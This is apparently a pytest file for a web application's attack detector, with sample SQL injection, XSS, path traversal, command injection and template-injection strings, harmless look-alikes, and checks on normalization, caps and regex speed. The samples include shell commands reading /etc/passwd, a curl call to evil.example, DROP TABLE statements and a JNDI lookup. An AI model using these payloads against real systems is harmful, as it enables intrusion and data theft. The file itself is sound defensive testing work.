"""The detector (app/detection): normalization, patterns, caps, and its safety rules.

These are hand-written examples of each attack type and of tricky harmless text, to show
the detector works and to catch regressions. They are NOT the detection study: the study
scores the detector on public collections it was never tuned on (research repository,
DS1 to DS3), so its numbers are not affected by what is written here.

Rules checked (docs/features/detection.md): DE4 (caps), DE5 (no slow patterns, timed on
worst-case input), DE7 (excerpt length), DE10 (no FastAPI or database code).
"""

import ast
import re
import time
from pathlib import Path

import pytest

from app.detection import KINDS, PATTERNS, inspect, kinds, matches, normalize
from app.detection.detector import MAX_EXCERPT_CHARS, MAX_TOTAL_CHARS, MAX_VALUE_CHARS, MAX_VALUES

# --- Attacks are flagged as their type -----------------------------------------------

ATTACKS = {
    "sql_injection": [
        "' OR 1=1--",
        "' or 'a'='a",
        '" OR "1"="1',
        "admin'--",
        "1 UNION SELECT username, password FROM users",
        "1 UNION/**/ALL/**/SELECT null,null",
        "1; DROP TABLE users",
        "x'; DELETE FROM shifts; --",
        "1 AND SLEEP(5)",
        "'; WAITFOR DELAY '0:0:5'--",
        "1 UNION SELECT table_name FROM information_schema.tables",
        "%27%20OR%201%3D1--",  # URL-encoded once
        "%2527%20OR%201%3D1--",  # URL-encoded twice
        "1 /*!50000UNION*/ /*!50000SELECT*/ 1",  # MySQL version comments
    ],
    "xss": [
        "<script>alert(1)</script>",
        "<ScRiPt src=//evil.example/x.js></script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onpageshow=alert(1)>",
        "javascript:alert(document.cookie)",
        "<iframe src=//evil.example>",
        "data:text/html;base64,PHNjcmlwdD4=",
        "&lt;script&gt;alert(1)&lt;/script&gt;",  # HTML entities
        "\uff1cscript\uff1ealert(1)",  # full-width < and >
        "%3Cscript%3Ealert(1)%3C/script%3E",
    ],
    "path_traversal": [
        "../../../etc/passwd",
        "..\\..\\..\\windows\\win.ini",
        "%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "....//....//etc/passwd",
        "/etc/shadow",
        "file:///proc/self/environ",
        "C:\\Windows\\System32\\drivers\\etc\\hosts",
        "../secret.txt%00.png",
    ],
    "command_injection": [
        "; cat /etc/passwd",
        "&& whoami",
        "| id",
        "`ls -la`",
        "$(curl evil.example)",
        "x || ping -c 1 evil.example",
        "/bin/sh -i",
        "cmd.exe /c dir",
        "cat${IFS}/etc/passwd",
    ],
    "format_string": [
        "{0.__class__.__init__.__globals__}",
        "{.__class__}",
        "%x%x%x%x",
        "%08x.%08x.%08x",
        "%n",
        "%s%s%s%s",
        "{{7*7}}",
        "{{ config.items() }}",
        "{% for x in range(9) %}",
        "${7*7}",
        "${jndi:ldap://evil.example/a}",
        "#{7*7}",
        "<%= 7*7 %>",
    ],
}


@pytest.mark.parametrize(
    ("kind", "value"), [(kind, value) for kind, values in ATTACKS.items() for value in values]
)
def test_attacks_are_flagged_as_their_type(kind: str, value: str) -> None:
    assert kind in kinds(value), (value, normalize(value))


# --- Tricky harmless text is not flagged ---------------------------------------------

# The design's own examples of hard harmless text, plus more of the same kind: names,
# notes, prices, and times that contain quotes, dots, %, $, <, ;, &, and braces.
HARMLESS = [
    "O'Brien",
    "D'Angelo O'Neil-Smith",
    "please select a new shift",
    "I'll drop by at 5",
    "<3",
    "see ../notes",
    "50% off, $5 now",
    "100% sure; see you at 9",
    "Meet at 5; bring snacks",
    "R&D and Q&A at 3pm",
    "a < b and c > d",
    "Ben's shift (7-3) or later",
    "can't make it, swap with Cara?",
    "email me: ana@example.com",
    "Use {name} in the greeting",
    "Price: $12.50 (tax incl.)",
    "union meeting at 6, then select a rep",
    "Order #42 for table 7",
    "Back in 10 -- grabbing coffee",
    "We're closed; type your name on the list",
]


@pytest.mark.parametrize("value", HARMLESS)
def test_tricky_harmless_text_is_not_flagged(value: str) -> None:
    assert kinds(value) == set(), [p.id for p, _ in matches(value)]


# --- Normalization ---------------------------------------------------------------------


@pytest.mark.parametrize(
    ("original", "normalized"),
    [
        ("%2527", "'"),  # URL-decoded twice
        ("%252527", "%27"),  # but never three times
        ("UNION+SELECT", "union select"),  # "+" is a space in form encoding
        ("&lt;b&gt; &#39;", "<b> '"),  # HTML entities
        ("\uff1cSCRIPT\uff1e", "<script>"),  # full-width look-alikes, then lowercase
        ("UNION/**/SELECT", "union select"),  # an inline comment where a space would go
        ("/*!50000UNION*/", " union "),  # a MySQL version comment keeps its text
        ("a \t\n  b", "a b"),  # whitespace runs become one space
    ],
)
def test_normalization_undoes_disguises(original: str, normalized: str) -> None:
    assert normalize(original) == normalized


# --- Caps (DE4) and excerpts (DE7) ---------------------------------------------------


def test_only_the_first_2000_characters_of_a_value_are_inspected() -> None:
    assert kinds("a" * (MAX_VALUE_CHARS - 20) + "<script>") == {"xss"}
    assert kinds("a" * MAX_VALUE_CHARS + "<script>") == set()


def test_a_request_contributes_at_most_200_values() -> None:
    values = [(f"query.v{n}", "harmless") for n in range(MAX_VALUES)]
    assert inspect([*values, ("query.late", "<script>")]) == []
    assert len(inspect([*values[:-1], ("query.last", "<script>")])) == 1


def test_a_request_contributes_at_most_100000_characters() -> None:
    full = [
        (f"body.v{n}", "a" * MAX_VALUE_CHARS) for n in range(MAX_TOTAL_CHARS // MAX_VALUE_CHARS)
    ]
    assert inspect([*full, ("body.late", "<script>")]) == []


def test_a_finding_names_the_field_pattern_type_and_original_text() -> None:
    [finding] = inspect([("body.note", "%3Cscript%3E")])
    assert finding.field == "body.note"
    assert finding.pattern_id == "XSS-01"
    assert finding.kind == "xss"
    assert finding.excerpt == "%3Cscript%3E"  # what was sent, not the decoded form


def test_the_excerpt_is_at_most_200_characters_of_the_original_around_the_match() -> None:
    value = "x" * 1000 + "<script>" + "y" * 900
    [finding] = inspect([("body.note", value)])
    assert len(finding.excerpt) == MAX_EXCERPT_CHARS
    assert "<script>" in finding.excerpt
    assert finding.excerpt in value


def test_one_value_can_match_several_types() -> None:
    # A command that reads a system file is both; the study counts it in both columns.
    assert kinds("; cat /etc/passwd") == {"command_injection", "path_traversal"}


# --- The patterns themselves ---------------------------------------------------------


def test_every_pattern_has_a_stable_id_and_a_known_type() -> None:
    for pattern in PATTERNS:
        assert re.fullmatch(r"(SQLI|XSS|PATH|CMD|FMT)-\d{2}", pattern.id), pattern.id
        assert pattern.kind in KINDS, pattern.id
    assert len({p.id for p in PATTERNS}) == len(PATTERNS)
    assert {p.kind for p in PATTERNS} == set(KINDS)  # every type has patterns


def _repeats(node: object) -> list[tuple[int, list]]:
    """Every repetition in a parsed regex: (its upper bound, what it repeats)."""
    import re._constants as c  # the parsed form of a regex (standard library, internal)

    found = []
    items = node.data if hasattr(node, "data") else node  # type: ignore[attr-defined]
    for op, arg in items:  # type: ignore[union-attr]
        if op in (c.MAX_REPEAT, c.MIN_REPEAT, c.POSSESSIVE_REPEAT):
            low, high, inner = arg
            found.append((high, inner))
            found += _repeats(inner)
        elif op in (c.SUBPATTERN, c.ATOMIC_GROUP):
            found += _repeats(arg[-1])
        elif op == c.BRANCH:
            for branch in arg[1]:
                found += _repeats(branch)
        elif op in (c.ASSERT, c.ASSERT_NOT):
            found += _repeats(arg[1])
    return found


@pytest.mark.parametrize("pattern", PATTERNS, ids=lambda p: p.id)
def test_no_pattern_can_backtrack_badly(pattern: object) -> None:
    """DE5 (threat D4): every repetition has an upper bound, and no repetition that can
    repeat more than once contains another repetition, such as (a+)+."""
    import re._constants as c
    import re._parser as parser

    tree = parser.parse(pattern.regex.pattern)  # type: ignore[attr-defined]
    for high, inner in _repeats(tree):
        assert high != c.MAXREPEAT, f"{pattern.id}: an unbounded repetition (*, +, or {{n,}})"  # type: ignore[attr-defined]
        if high > 1:
            nested = [h for h, _ in _repeats(inner) if h > 1]
            assert not nested, f"{pattern.id}: a repetition inside a repetition"  # type: ignore[attr-defined]


# Crafted worst cases at the 2,000 character cap: long runs of characters that ALMOST
# match some pattern, so a badly written regex would try and retry for a long time.
WORST_CASES = [
    "'" * MAX_VALUE_CHARS,
    "' or " * (MAX_VALUE_CHARS // 5),
    "<a " * (MAX_VALUE_CHARS // 3),
    "<" + "a" * (MAX_VALUE_CHARS - 1),
    "<a" + " x=1" * (MAX_VALUE_CHARS // 4),
    "../" * (MAX_VALUE_CHARS // 3),
    "..\\" * (MAX_VALUE_CHARS // 3) + "x",
    "; " * (MAX_VALUE_CHARS // 2),
    "%x" * (MAX_VALUE_CHARS // 2),
    "%1" * (MAX_VALUE_CHARS // 2),
    "{" * MAX_VALUE_CHARS,
    "{{" + "a" * (MAX_VALUE_CHARS - 2),
    "${" + "a" * (MAX_VALUE_CHARS - 2),
    "{0." * (MAX_VALUE_CHARS // 3),
    "/*" * (MAX_VALUE_CHARS // 2),
    "union " * (MAX_VALUE_CHARS // 6),
    "%25" * (MAX_VALUE_CHARS // 3),
    "&amp;" * (MAX_VALUE_CHARS // 5),
    "a" * MAX_VALUE_CHARS,
]
# The budget for one value through the WHOLE detector (normalize and every pattern). Real
# values take well under a millisecond; this is generous so a slow CI machine does not
# fail the test, while a pattern that backtracks badly takes seconds and still fails it.
BUDGET_SECONDS = 0.05


@pytest.mark.parametrize("value", WORST_CASES, ids=lambda v: repr(v[:12]))
def test_worst_case_input_is_inspected_quickly(value: str) -> None:
    """DE5: crafted near-matches at the cap finish within the budget (median of 5)."""
    times = []
    for _ in range(5):
        start = time.perf_counter()
        matches(value)
        times.append(time.perf_counter() - start)
    assert sorted(times)[2] < BUDGET_SECONDS, sorted(times)


# --- DE10: plain Python only -------------------------------------------------------

FORBIDDEN = ("fastapi", "starlette", "sqlalchemy", "pymysql", "pydantic")


def test_the_detector_has_no_fastapi_or_database_code() -> None:
    """DE10: the study must score exactly the code the API runs, so the detector cannot
    depend on the web framework, the database, or the rest of the application."""
    package = Path(__file__).resolve().parents[2] / "app" / "detection"
    for source in package.glob("*.py"):
        for node in ast.walk(ast.parse(source.read_text(encoding="utf-8"))):
            names = []
            if isinstance(node, ast.Import):
                names = [alias.name for alias in node.names]
            elif isinstance(node, ast.ImportFrom) and node.module:
                names = [node.module]
            for name in names:
                assert not name.startswith(FORBIDDEN), f"{source.name} imports {name}"
                if name.startswith("app."):
                    assert name.startswith("app.detection"), f"{source.name} imports {name}"
